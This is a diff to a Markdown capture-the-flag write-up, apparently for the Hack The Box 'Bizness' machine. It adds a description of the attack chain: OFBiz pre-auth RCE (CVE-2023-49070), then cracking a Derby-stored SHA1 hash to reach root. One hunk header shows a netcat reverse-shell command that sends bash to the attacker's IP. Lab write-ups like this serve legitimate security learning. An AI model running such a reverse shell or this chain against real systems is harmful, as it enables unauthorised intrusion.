@@ -10,11 +10,16 @@ categories: [Hack The Box,"Season 4: Savage Lands"]
 tags: [labs,cryptedBytes,OFBiz,XML-RPC,Bussiness Logic Vulnerability]
 ---
 
-[Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/582)
 
 # WriteUp
 
-# User
+- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/582)
+
+## Description
+- Bizness is an easy Linux machine showcasing an Apache OFBiz pre-authentication, remote code execution (RCE) foothold, classified as [`CVE-2023-49070`](https://nvd.nist.gov/vuln/detail/CVE-2023-49070). The exploit is leveraged to obtain a shell on the box, where enumeration of the OFBiz configuration reveals a hashed password in the service&#039;s Derby database. Through research and little code review, the hash is transformed into a more common format that can be cracked by industry-standard tools. The obtained password is used to log into the box as the root user.
+
+
+## User
 
 - The pentester starts with a port scan and discovers that ports `22`, `80`, `443`, and `37703` are open. Upon noticing the existence of the domain `bizness.htb`, they proceed to add it to the `/etc/hosts` file.
 
@@ -176,7 +181,7 @@ nc 10.10.14.193 4444 -e /bin/bash
 
 ![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510130057.png)
 
-# Root
+## Root
 
 - After exhaustive enumeration, it was discovered that the webserver of the OFBiz software is using the default `Derby` RDBMS. The pentester conducted a password search with the following command, finding `SHA1` hashes (identical for different accounts), indicating the encryption type in use for storing credentials.
 
